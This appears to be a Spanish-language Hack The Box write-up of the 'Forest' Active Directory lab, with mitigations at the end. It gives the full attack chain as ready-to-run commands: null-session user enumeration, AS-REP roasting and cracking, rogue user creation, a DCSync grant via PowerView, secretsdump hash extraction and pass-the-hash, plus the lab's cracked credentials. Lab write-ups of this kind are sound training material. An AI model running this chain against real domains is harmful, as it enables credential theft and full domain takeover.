@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Forest — Writeup | Héctor Vallvé</title>
+<meta name="description" content="Writeup de la máquina Forest (Hack The Box): AS-REP Roasting, abuso de ACLs con BloodHound y DCSync hasta Domain Admin.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/site.css">
+<link rel="stylesheet" href="../../assets/css/writeup.css">
+</head>
+<body>
+
+<header class="site-nav">
+  <div class="nav-inner">
+    <a class="nav-id" href="../../index.html" style="text-decoration:none;">
+      <span class="dot"></span>
+      <span class="name">Héctor Vallvé</span>
+    </a>
+    <nav class="links">
+      <a href="../../index.html#sobre-mi">Sobre mí</a>
+      <a href="../../index.html#certificaciones">Certificaciones</a>
+      <a href="../../index.html#proyectos">Proyectos</a>
+      <a href="../index.html">Writeups</a>
+      <a href="../../index.html#contacto">Contacto</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap writeup-main">
+  <a class="back-link mono" href="../index.html">&larr; Todos los writeups</a>
+
+  <div class="writeup-head">
+    <span class="tag mono">Fácil · hackthebox · active directory</span>
+    <h1>Forest</h1>
+  </div>
+
+  <article class="writeup-body">
+
+<h2>Resumen</h2>
+<p>Forest es una máquina de Active Directory que permite practicar un ataque end-to-end contra un Domain Controller sin necesidad de explotar ninguna vulnerabilidad de software. Todo el camino de ataque se apoya en configuraciones por defecto y permisos mal asignados: enumeración de usuarios vía sesión nula, AS-REP Roasting para el acceso inicial, abuso de pertenencia a <strong>Account Operators</strong>, abuso de un <strong>WriteDacl</strong> heredado de <strong>Exchange Windows Permissions</strong> y, finalmente, un <strong>DCSync</strong> para extraer el hash del Administrador del dominio.</p>
+
+<h2>1. Reconocimiento</h2>
+<p>Escaneo inicial de todos los puertos:</p>
+<pre class="code-block mono"><code>nmap -p- --open -sS --min-rate 5000 10.129.X.X -oX scans/first_scan.xml
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+...</code></pre>
+<p>La combinación de puertos (53, 88, 389, 445, 3268/3269 Global Catalog, 9389 ADWS, 464 kpasswd) identifica inequívocamente un <strong>Domain Controller</strong> de Active Directory.</p>
+<p>Escaneo de versiones sobre los puertos relevantes:</p>
+<pre class="code-block mono"><code>nmap -p 53,88,139,389,445,464,3268,3269,9389 -sC -sV 10.129.X.X -oX scans/second_scan.xml
+
+PORT     STATE SERVICE      VERSION
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 (workgroup: HTB)
+...
+Computer name: FOREST
+Domain name: htb.local
+Forest name: htb.local
+FQDN: FOREST.htb.local</code></pre>
+<div class="callout"><div class="callout-title mono">Nota</div><div class="callout-body">Durante la enumeración Kerberos se observó un desfase de reloj (<em>clock-skew</em>) considerable entre el atacante y el DC. Kerberos exige que ambos relojes estén sincronizados (por defecto, un máximo de 5 minutos de diferencia), ya que los tickets incluyen una marca de tiempo para prevenir ataques de repetición. Este desfase provocó errores <code class="mono">KRB_AP_ERR_SKEW</code> en operaciones posteriores basadas en Kerberos, resueltos sincronizando la hora local con la del DC.</div></div>
+<p><strong>Datos obtenidos:</strong> nombre de dominio (<code class="mono">htb.local</code>), nombre NetBIOS (<code class="mono">FOREST</code>) y versión del SO (Windows Server 2016).</p>
+
+<h2>2. Enumeración de usuarios (sesión nula)</h2>
+<p>El usuario <code class="mono">guest</code> existe pero está deshabilitado:</p>
+<pre class="code-block mono"><code>nxc smb 10.129.X.X -u 'guest' -p '' --shares
+[-] htb.local\guest: STATUS_ACCOUNT_DISABLED</code></pre>
+<p>Sin embargo, el servidor permite una <strong>sesión nula RPC</strong> (<code class="mono">-U "" -N</code>, sin usuario ni contraseña), lo que es una mala configuración habitual en entornos AD heredados:</p>
+<pre class="code-block mono"><code>rpcclient -U "" -N htb.local
+rpcclient $&gt; enumdomusers</code></pre>
+<p>Esto permitió listar todos los usuarios y grupos del dominio, incluyendo varias cuentas de servicio de Exchange y usuarios "normales". Usuarios relevantes: <code class="mono">Administrator</code>, <code class="mono">krbtgt</code>, <code class="mono">sebastien</code>, <code class="mono">lucinda</code>, <code class="mono">svc-alfresco</code>, <code class="mono">andy</code>, <code class="mono">mark</code>, <code class="mono">santi</code>. Grupos relevantes: <code class="mono">Account Operators</code>, <code class="mono">Exchange Windows Permissions</code>, <code class="mono">Domain Admins</code>, <code class="mono">Enterprise Admins</code>.</p>
+<p>Esta lista de usuarios se guardó (<code class="mono">users.txt</code>) para usarla en los siguientes pasos.</p>
+
+<h2>3. Acceso inicial — AS-REP Roasting (MITRE T1558.004)</h2>
+<p>Antes de intentar AS-REP Roasting se probó un ataque de <em>password spraying</em> básico con <code class="mono">nxc</code> contra la lista de usuarios (contraseña vacía / contraseñas comunes), sin resultado.</p>
+<p>El siguiente paso fue comprobar si algún usuario tiene la preautenticación Kerberos desactivada (flag <code class="mono">UF_DONT_REQUIRE_PREAUTH</code> en su <code class="mono">userAccountControl</code>). Si es el caso, el KDC entrega directamente un TGT cifrado con la clave derivada de la contraseña del usuario, <strong>sin validar ninguna credencial previa</strong> — por lo que el ticket se puede solicitar y crackear offline sin haberse autenticado nunca:</p>
+<pre class="code-block mono"><code>nxc ldap 10.129.X.X -u users.txt -p '' --asreproast asrep_hashes.txt
+
+[+] $krb5asrep$23$svc-alfresco@HTB.LOCAL:09a027bef118df0b438b91669582176c$4919aa9a...</code></pre>
+<p>La cuenta <code class="mono">svc-alfresco</code> tenía la preautenticación deshabilitada. Cracking offline del hash con hashcat:</p>
+<pre class="code-block mono"><code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code></pre>
+<div class="callout"><div class="callout-title mono">Usuario y contraseña</div><div class="callout-body"><strong>Usuario:</strong> svc-alfresco<br><strong>Contraseña:</strong> s3rvice</div></div>
+<p>Verificación de las credenciales:</p>
+<pre class="code-block mono"><code>nxc smb 10.129.X.X -u 'svc-alfresco' -p 's3rvice'
+SMB   10.129.X.X   445   FOREST   [+] htb.local\svc-alfresco:s3rvice</code></pre>
+
+<h2>4. Movimiento lateral — BloodHound y abuso de ACLs</h2>
+<p>Recolección de datos de AD con <code class="mono">bloodhound-python</code>:</p>
+<pre class="code-block mono"><code>bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c ALL -ns 10.129.X.X</code></pre>
+<p>Al cargar los datos en BloodHound se identificó la ruta de ataque hacia Domain Admin:</p>
+<figure class="shot"><img src="img/forest/img01.png" alt="Grafo de BloodHound - pertenencia a grupos" loading="lazy"></figure>
+<figure class="shot"><img src="img/forest/img02.png" alt="Grafo de BloodHound - ruta de ataque" loading="lazy"></figure>
+<p><code class="mono">svc-alfresco</code> pertenece (de forma anidada) al grupo <strong>Account Operators</strong>.</p>
+<div class="callout"><div class="callout-title mono">¿Por qué es relevante Account Operators?</div><div class="callout-body">Es un grupo privilegiado integrado que permite crear y modificar objetos de usuario del dominio <strong>sin ser Domain Admin</strong>. Esto permite crear una cuenta propia y añadirla a cualquier grupo donde interese escalar privilegios — en este caso, un grupo con WriteDacl.</div></div>
+<p>El grafo también muestra que el grupo <strong>Exchange Windows Permissions</strong> tiene permiso <strong>WriteDacl</strong> sobre el objeto del dominio.</p>
+<div class="callout"><div class="callout-title mono">¿Por qué es relevante WriteDacl?</div><div class="callout-body">WriteDacl sobre el objeto de dominio permite modificar su ACL (lista de control de acceso), es decir, concederse a uno mismo (o a cualquier otro principal) cualquier otro permiso sobre el dominio — incluyendo los derechos <code class="mono">DS-Replication-Get-Changes</code> y <code class="mono">DS-Replication-Get-Changes-All</code>, que juntos habilitan un ataque <strong>DCSync</strong> para extraer los hashes de cualquier usuario del dominio, incluido el Administrador.</div></div>
+<p>Con esto, la cadena de ataque queda clara: <code class="mono">svc-alfresco</code> &rarr; Account Operators (crear usuario) &rarr; usuario nuevo en Exchange Windows Permissions (heredar WriteDacl) &rarr; WriteDacl sobre el dominio &rarr; DCSync &rarr; hash del Administrador.</p>
+<p>Acceso a la máquina:</p>
+<pre class="code-block mono"><code>evil-winrm -i 10.129.X.X -u svc-alfresco -p s3rvice</code></pre>
+<p>Obtengo la flag correspondiente al usuario.</p>
+<figure class="shot"><img src="img/forest/img03.png" alt="Acceso inicial por WinRM" loading="lazy"></figure>
+<p>Aprovechando los privilegios de Account Operators, se crea un usuario propio y se añade a los grupos necesarios:</p>
+<pre class="code-block mono"><code>net user hacker ******** /add /domain
+net group "Exchange Windows Permissions" hacker /add
+net localgroup "Remote Management Users" hacker /add</code></pre>
+<figure class="shot"><img src="img/forest/img04.png" alt="Creación de usuario" loading="lazy"></figure>
+<figure class="shot"><img src="img/forest/img05.png" alt="Añadido a Exchange Windows Permissions" loading="lazy"></figure>
+<figure class="shot"><img src="img/forest/img06.png" alt="Añadido a Remote Management Users" loading="lazy"></figure>
+<p>El grupo Remote Management Users es necesario para poder autenticar con este usuario vía WinRM; Exchange Windows Permissions hereda el WriteDacl sobre el dominio identificado en BloodHound.</p>
+
+<h2>5. Escalada a Domain Admin — DCSync (MITRE T1003.006)</h2>
+<p>Con el nuevo usuario ya dentro de Exchange Windows Permissions, el siguiente paso es concederse explícitamente el derecho de replicación (DCSync) sobre el dominio, usando <code class="mono">PowerView.ps1</code>:</p>
+<pre class="code-block mono"><code>$SecPassword = ConvertTo-SecureString '********' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\hacker', $SecPassword)
+
+Add-DomainObjectAcl -PrincipalIdentity 'hacker' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync</code></pre>
+<p>Con el derecho DCSync concedido, se extraen los hashes de todo el dominio:</p>
+<pre class="code-block mono"><code>secretsdump.py htb.local/svc-alfresco:s3rvice@10.129.X.X
+
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</code></pre>
+<p>Verificación con crackmapexec / nxc de que el hash es válido para el Administrador del dominio:</p>
+<figure class="shot"><img src="img/forest/img07.png" alt="Validación del hash del Administrador" loading="lazy"></figure>
+
+<h2>6. Compromiso final</h2>
+<p>Acceso como Administrador mediante Pass-the-Hash:</p>
+<pre class="code-block mono"><code>evil-winrm -i 10.129.X.X -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'</code></pre>
+<figure class="shot"><img src="img/forest/img08.png" alt="Shell como Administrador" loading="lazy"></figure>
+<p>Control total del Domain Controller.</p>
+
+<h2>Cadena de ataque (MITRE ATT&amp;CK)</h2>
+<p><strong>Enumeración de usuarios</strong> — Sesión nula RPC (T1087.002)<br>
+<strong>Acceso inicial</strong> — AS-REP Roasting (T1558.004)<br>
+<strong>Escalada lateral</strong> — Abuso de pertenencia a Account Operators (T1098)<br>
+<strong>Escalada de privilegios</strong> — Abuso de ACL (WriteDacl) + DCSync (T1003.006)<br>
+<strong>Acceso final</strong> — Pass-the-Hash (T1550.002)</p>
+
+<h2>Mitigación</h2>
+<p><strong>Deshabilitar sesiones nulas</strong> (RestrictAnonymous / RestrictAnonymousSAM) para evitar la enumeración de usuarios y grupos sin autenticación.<br>
+<strong>Forzar la preautenticación Kerberos</strong> en todas las cuentas; auditar periódicamente el atributo UF_DONT_REQUIRE_PREAUTH.<br>
+<strong>Políticas de contraseñas robustas</strong> en cuentas de servicio — s3rvice es una contraseña débil y predecible, crackeable con una wordlist estándar en segundos.<br>
+<strong>Revisar la pertenencia a grupos privilegiados integrados</strong> (Account Operators, Backup Operators, etc.) y aplicar el principio de mínimo privilegio.<br>
+<strong>Auditar las ACLs del dominio</strong> regularmente (p. ej. con BloodHound) para detectar permisos heredados o mal configurados como WriteDacl, GenericAll o GenericWrite sobre objetos sensibles.<br>
+<strong>Monitorizar eventos de DCSync</strong> (Event ID 4662 con los GUIDs de DS-Replication-Get-Changes) para detectar extracciones de hashes no autorizadas.</p>
+
+  </article>
+
+  <a class="back-link mono" href="../index.html">&larr; Todos los writeups</a>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-row">
+      <p>Disponible para oportunidades en pentesting y seguridad ofensiva.<br>hectorvallveg@gmail.com</p>
+      <div class="foot-links">
+        <a href="mailto:hectorvallveg@gmail.com">Email</a>
+        <a href="https://github.com/Hector423" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://www.linkedin.com/in/hector-vallve-gomez/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://app.hackthebox.com/users/1756507" target="_blank" rel="noopener">Hack The Box</a>
+      </div>
+    </div>
+    <div class="copyright mono">© 2026 Héctor Vallvé</div>
+  </div>
+</footer>
+
+</body>
+</html>
